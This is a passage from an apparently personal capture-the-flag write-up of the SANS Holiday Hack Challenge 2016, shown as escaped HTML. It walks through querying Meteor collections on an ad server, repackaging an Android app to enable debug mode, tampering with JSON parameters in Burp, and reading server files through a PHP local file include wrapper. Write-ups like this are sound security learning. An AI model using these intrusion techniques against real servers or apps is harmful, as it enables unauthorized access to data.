&lt;span class=&quot;pi&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;GDT&lt;/span&gt;   
&lt;span class=&quot;err&quot;&gt;G&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;DT&amp;gt;DT&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ntry:    1024&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;he elf, satisified with the trade says -&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;end email to &quot;peppermint@northpolewonderland.com&quot; for that which you seek.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next, I sent an e-mail off to &lt;code class=&quot;highlighter-rouge&quot;&gt;peppermint@northpolewonderland.com&lt;/code&gt; and moments later, receive the following automated response…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/email_response.png&quot; alt=&quot;email_response&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The Dungeon Game challenge is complete!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;the-banner-ad-server&quot;&gt;The Banner Ad Server&lt;/h3&gt;

&lt;p&gt;At first glance, &lt;code class=&quot;highlighter-rouge&quot;&gt;http://ads.northpolewonderland.com&lt;/code&gt; seems to be a basic webpage without much going on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/ad_site2.png&quot; alt=&quot;banner_AD1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viewing the page source discloses that the site is using Meteor release version &lt;code class=&quot;highlighter-rouge&quot;&gt;METEOR@1.4.2.3&lt;/code&gt;,  which was released on November 17, 2016 according to the &lt;a href=&quot;https://github.com/meteor/meteor/releases&quot;&gt;GitHub release timeline&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/ad_pagesource.png&quot; alt=&quot;banner_AD_source&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Luckily, there was a recent SANS blog post titled &lt;a href=&quot;https://pen-testing.sans.org/blog/2016/12/06/mining-meteor&quot;&gt;Mining Meteor&lt;/a&gt;.  Following the guidance in that post, I installed the &lt;a href=&quot;https://tampermonkey.net&quot;&gt;TamperMonkey&lt;/a&gt; add-on in Firefox and setup the &lt;a href=&quot;https://github.com/nidem/MeteorMiner&quot;&gt;MeteorMiner&lt;/a&gt; script to help visualize the active subscriptions and the collections for Meteor.&lt;/p&gt;

&lt;p&gt;Firefox’s browser developer tools (specifically the web console) will help with this challenge tremendously.&lt;/p&gt;

&lt;p&gt;Now that the &lt;code class=&quot;highlighter-rouge&quot;&gt;TamperMonkey&lt;/code&gt; with the &lt;code class=&quot;highlighter-rouge&quot;&gt;MeteorMiner&lt;/code&gt; script was active, I’ll load the page again.  The default pages shows 4 records under &lt;code class=&quot;highlighter-rouge&quot;&gt;HomeQuotes&lt;/code&gt; under &lt;code class=&quot;highlighter-rouge&quot;&gt;Collections&lt;/code&gt; (1).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/ad_4_HomeQuotes.png&quot; alt=&quot;banner_AD2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s also worth noting that the &lt;a href=&quot;https://github.com/nidem/MeteorMiner&quot;&gt;MeteorMiner&lt;/a&gt; script helps identify pages that would not have been accessible otherwise. The pages were listed under &lt;code class=&quot;highlighter-rouge&quot;&gt;Routes&lt;/code&gt;.  Click the arrow to the right of &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/quotes&lt;/code&gt; (1) and that will take you to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/quotes&lt;/code&gt; page.&lt;/p&gt;

&lt;p&gt;While there may not be anything useful displayed on the page, a new record appeared within the &lt;code class=&quot;highlighter-rouge&quot;&gt;HomeQuotes&lt;/code&gt; (2) section under &lt;code class=&quot;highlighter-rouge&quot;&gt;Collections&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/ad_5_HomeQuotes.png&quot; alt=&quot;banner_AD3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To see everything that’s included within &lt;code class=&quot;highlighter-rouge&quot;&gt;adminQuotes&lt;/code&gt;, open the Firefox web console (from the keyboard: press Ctrl+Shift+K or Cmd+Option+K on a Mac)&lt;/p&gt;

&lt;p&gt;With the web console open, type &lt;code class=&quot;highlighter-rouge&quot;&gt;HomeQuotes.find().fetch()&lt;/code&gt; then press enter to display all the objects (1).  Click on the fifth object (2) to see the link to the the audio file (3).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/ad_site_audiofile.png&quot; alt=&quot;banner_AD_flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks to &lt;code class=&quot;highlighter-rouge&quot;&gt;MeteorMiner&lt;/code&gt;, the collections information was visible and I knew exactly what to query from within the Firefox web console.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Banner Ad Server complete!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;the-debug-server&quot;&gt;The Debug Server&lt;/h3&gt;

&lt;p&gt;Completing the Debug Server challenge required changing the APK file.  By default, debug mode on the StantaGram app is disabled.  In &lt;a href=&quot;/challenges/#part-2-awesome-package-konveyance&quot;&gt;Part 2&lt;/a&gt;, I covered how to extract an APK file with &lt;a href=&quot;https://ibotpeaches.github.io/Apktool/&quot;&gt;apktool&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I’ll pick up from already having the SantaGram app decompiled.&lt;/p&gt;

&lt;p&gt;Let’s do a case insensitive (-i), recursive (-r), &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; command to see where the word &lt;code class=&quot;highlighter-rouge&quot;&gt;debug&lt;/code&gt; appears in any files within the StantaGram_4.2 directory…&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i -r &quot;debug&quot; .&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./res/values/public.xml&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;&amp;lt;public type=&quot;string&quot; name=&quot;debug_data_collection_url&quot; id=&quot;0x7f07001d&quot; /&amp;gt;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./res/values/public.xml&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;&amp;lt;public type=&quot;string&quot; name=&quot;debug_data_enabled&quot; id=&quot;0x7f07001e&quot; /&amp;gt;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./res/values/strings.xml&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;&amp;lt;string name=&quot;debug_data_collection_url&quot;&amp;gt;http://dev.northpolewonderland.com/index.php&amp;lt;/string&amp;gt;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./res/values/strings.xml&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;&amp;lt;string name=&quot;debug_data_enabled&quot;&amp;gt;false&amp;lt;/string&amp;gt;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/android/support/v7/view/menu/h.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;.annotation runtime Landroid/view/ViewDebug$CapturedViewProperty;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/android/support/v7/view/menu/h.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;.annotation runtime Landroid/view/ViewDebug$CapturedViewProperty;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/android/support/v7/widget/ActionMenuView$c.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;.annotation runtime Landroid/view/ViewDebug$ExportedProperty;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/android/support/v7/widget/ActionMenuView$c.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;.annotation runtime Landroid/view/ViewDebug$ExportedProperty;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/android/support/v7/widget/ActionMenuView$c.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;.annotation runtime Landroid/view/ViewDebug$ExportedProperty;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/android/support/v7/widget/ActionMenuView$c.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;.annotation runtime Landroid/view/ViewDebug$ExportedProperty;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/android/support/v7/widget/ActionMenuView$c.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;.annotation runtime Landroid/view/ViewDebug$ExportedProperty;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/com/northpolewonderland/santagram/b.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;invoke-static {}, Landroid/os/Debug;-&amp;gt;getNativeHeapAllocatedSize()J&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/com/northpolewonderland/santagram/EditProfile.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;const-string v3, &quot;Remote debug logging is Enabled&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/com/northpolewonderland/santagram/EditProfile.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;const-string v1, &quot;debug&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/com/northpolewonderland/santagram/EditProfile.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;const-string v3, &quot;Remote debug logging is Disabled&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/com/northpolewonderland/santagram/EditProfile.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;const-string v3, &quot;Error posting JSON debug data&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/com/northpolewonderland/santagram/SplashScreen.smali:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;invoke-static&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Landroid/os/Debug;-&amp;gt;getNativeHeapAllocatedSize()J&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;./smali/com/parse/Parse.smali:.field&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;final&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;LOG_LEVEL_DEBUG:I&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0x3&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Of all the matches, the file &lt;code class=&quot;highlighter-rouge&quot;&gt;./res/values/strings.xml&lt;/code&gt; looked promising.  The file was edited to change the &lt;code class=&quot;highlighter-rouge&quot;&gt;debug_data_enabled=false&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;. It’s worth noting that the &lt;code class=&quot;highlighter-rouge&quot;&gt;EditProfile.smali&lt;/code&gt; appears to check if debug mode is enabled or not.  Time to change the file, rebuild, then upload to the emulator.&lt;/p&gt;

&lt;p&gt;The APK rebuild process is covered very well in the &lt;a href=&quot;https://www.youtube.com/watch?v=mo2yZVRicW0&quot;&gt;Manipulating Android Applications&lt;/a&gt; video.  Watch this to understand how to setup your environment and how to sign the APK file.&lt;/p&gt;

&lt;p&gt;I also installed the Burp proxy certificate on the Android emulator.  To do this, follow the steps in &lt;a href=&quot;https://support.portswigger.net/customer/portal/questions/12817785-how-to-use-burp-proxy-with-an-emulated-android-device-&quot;&gt;this post&lt;/a&gt; from the PortSwigger support forum.&lt;/p&gt;

&lt;p&gt;I wrote a quick bash script to automate the process of removing the APK from the emulator, building a new version, signing it, and reinstalling.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016 $ cat quick_apk.sh&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;echo [*] Uninstalling APK&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;## Uninstall&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/Users/josh/Library/Android/sdk/platform-tools/adb'&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;uninstall com.northpolewonderland.santagram&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;echo [*] Building new APK&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;## Build New APK&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;java -jar '/Users/josh/HolidayHack2016/apktool_2.2.1.jar' b SantaGram_4.2&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;echo [*] Signing new APK&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;## Sign New APK&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/Applications/Android&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Studio.app/Contents/jre/jdk/Contents/Home/bin/jarsigner'&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;-sigalg SHA1withRSA -digestalg SHA1 -keystore /Users/josh/HolidayHack2016/keys/SantaGram.keystore /Users/josh/HolidayHack2016/SantaGram_4.2/dist/SantaGram_4.2.apk SantaGram&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;sleep 1&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;echo [*] Installing new APK&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;## Install New APK&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/Users/josh/Library/Android/sdk/platform-tools/adb'&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;install /Users/josh/HolidayHack2016/SantaGram_4.2/dist/SantaGram_4.2.apk&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;echo [!] Complete&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The updated APK with the modified &lt;code class=&quot;highlighter-rouge&quot;&gt;strings.xml&lt;/code&gt; file has been loaded into the emulator.  Time to login to the app and visit the Edit Profile section.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/debug1.png&quot; alt=&quot;debug1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Burp shows a POST request sent to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://dev.northpolewonderland.com&lt;/code&gt; after entering the Edit Profile section.  Let’s select that request and send it to repeater to play with the JSON parameters.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/debug2.png&quot; alt=&quot;debug1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The image above shows the original request and response.  The response includes &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;verbose&quot;:false&lt;/code&gt;, what if &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;verbose&quot;:true&lt;/code&gt; was included in the request?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/debug3.png&quot; alt=&quot;debug1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Look at that. Because the information being sent from the client (me) is not validated server side, I am able to view the verbose information which includes the debug audio file.  Ideally, if sensitive information is included in the verbose response, only approved specified users should be able to successfully request that information.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016 $ curl -O http://dev.northpolewonderland.com/debug-20161224235959-0.mp3&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current&lt;/span&gt;
                                 &lt;span class=&quot;s&quot;&gt;Dload  Upload   Total   Spent    Left  Speed&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;100  212k  100  212k    0     0   743k      0 --:--:-- --:--:-- --:--:--  744k&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016 $ file debug-20161224235959-0.mp3&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;debug-20161224235959-0.mp3&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Audio file with ID3 version 2.3.0, contains&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;The Debug Server is complete!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;the-uncaught-exception-handler-server&quot;&gt;The Uncaught Exception Handler Server&lt;/h3&gt;

&lt;p&gt;Much like in the previous Debug Server challenge, finding the audio file within the Uncaught Exception Handler Server required going back into the SantaGram APK decompiled folder and making modifications to the source code of the app.  Most apps do not trigger exceptions (crashes) when using the app normally (at least you hope not). Let’s make sure this app triggers an exception and watch what happens.&lt;/p&gt;

&lt;p&gt;In &lt;a href=&quot;/challenges/#part-2-awesome-package-konveyance&quot;&gt;Part 2&lt;/a&gt;, I covered how to extract an APK file with &lt;a href=&quot;https://ibotpeaches.github.io/Apktool/&quot;&gt;apktool&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I’ll pick up from already having the SantaGram app decompiled. I already know from the Debug Server challenge that the &lt;code class=&quot;highlighter-rouge&quot;&gt;EditProfile.smali&lt;/code&gt; file is called when pressing the Edit Profile button.  With this information, it is possible to tweak that file causing a targeted exception when the Edit Profile button is pressed.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i &quot;exception&quot; ./smali/com/northpolewonderland/santagram/EditProfile.smali&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;.catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;move-exception v1&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;invoke-virtual {v1}, Ljava/io/IOException;-&amp;gt;printStackTrace()V&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;.catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;move-exception v0&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;invoke-virtual {v0}, Ljava/lang/Exception;-&amp;gt;getMessage()Ljava/lang/String;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;A quick grep for the word &lt;code class=&quot;highlighter-rouge&quot;&gt;exception&lt;/code&gt; within the EditProfile.smali file has some hits.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i &quot;exception&quot; ./smali/com/northpolewonderland/santagram/EditProfile.smali&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;.catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;move-exception v1&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;invoke-virtual {v1}, Ljava/io/IOException;-&amp;gt;printStackTrace()V&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;.catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;move-exception v0&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;invoke-virtual {v0}, Ljava/lang/Exception;-&amp;gt;getMessage()Ljava/lang/String;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The logic to catch an exception (if it should happen) is there, let’s make sure it triggers.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016 $ vim ./smali/com/northpolewonderland/santagram/EditProfile.smali&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;lt;!--OUTPUT TRUNCATED--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;101     if-ne p1, v1, :cond_2&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;102&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;103     :try_start_0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;104     invoke-virtual {p0}, Lcom/northpolewonderland/santagram/EditProfile;-&amp;gt;getApplicationContext()Landroid/content/Context;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;105&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;106     move-result-object v1&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;107&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;108     invoke-virtual {v1}, Landroid/content/Context;-&amp;gt;getContentResolver()Landroid/content/ContentResolver;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;109&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;110     move-result-object v1&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;111&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;112     invoke-virtual {p3}, Landroid/content/Intent;-&amp;gt;getData()Landroid/net/Uri;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;113&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;114      move-result-object v2&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# Replacing with move-exception v1&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;115&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;116     invoke-static {v1, v2}, Landroid/provider/MediaStore$Images$Media;-&amp;gt;getBitmap(Landroid/content/ContentResolver;Landroid/net/Uri;)Landroid/graphics/Bitmap;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;117     :try_end_0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;118     .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;119&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;120     move-result-object v0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;121&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;122     move-object v1, v0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;123&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;124     goto :goto_0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;125&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;126     :catch_0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;127     move-exception v1&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;128&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;129     invoke-virtual {v1}, Ljava/io/IOException;-&amp;gt;printStackTrace()V&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;130&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;131     :cond_2&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;132     move-object v1, v0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;133&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;134     goto :goto_0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;lt;!--OUTPUT TRUNCATED--&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Changing line number 114 in the &lt;code class=&quot;highlighter-rouge&quot;&gt;EditProfile.smali&lt;/code&gt; file to be &lt;code class=&quot;highlighter-rouge&quot;&gt;move-exception v1&lt;/code&gt; will cause the app to throw an exception after pressing the Edit Profile button.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/crash_dump1.png&quot; alt=&quot;exception1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From here,  take that POST request and send it to Repeater within Burp.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/crash_dump2.png&quot; alt=&quot;exception1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The POST request generated a crashdump file called &lt;code class=&quot;highlighter-rouge&quot;&gt;crashdump-aDjJbG.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/crash_dump3.png&quot; alt=&quot;exception1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When trying to fuzz the operation parameter, the error message displayed in the response discloses what the valid JSON keys are.  I already saw what the &lt;code class=&quot;highlighter-rouge&quot;&gt;WriteCrashDump&lt;/code&gt; request looks like, let’s see what the &lt;code class=&quot;highlighter-rouge&quot;&gt;ReadCrashDump&lt;/code&gt; responds with…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/crash_dump4.png&quot; alt=&quot;exception1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Getting a little further.  Now it wants a &lt;code class=&quot;highlighter-rouge&quot;&gt;crashdump&lt;/code&gt; key set. Might as well specify a crashdump file to read also, since I have the name of the file generated earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/crash_dump5.png&quot; alt=&quot;exception1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So the .php extension is not required.  To solve the final part of this challenge requires having a way to pull a PHP file from the server.  A recent SANS blog post titled &lt;a href=&quot;https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities&quot;&gt;Getting MOAR Value out of PHP Local File Include Vulnerabilities&lt;/a&gt; pointed me in the right direction. Specifically, I will be using a PHP wrapper to base64 encode the target file and then I can decode it easily.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/crash_dump6.png&quot; alt=&quot;exception1&quot; /&gt;&lt;/p&gt;

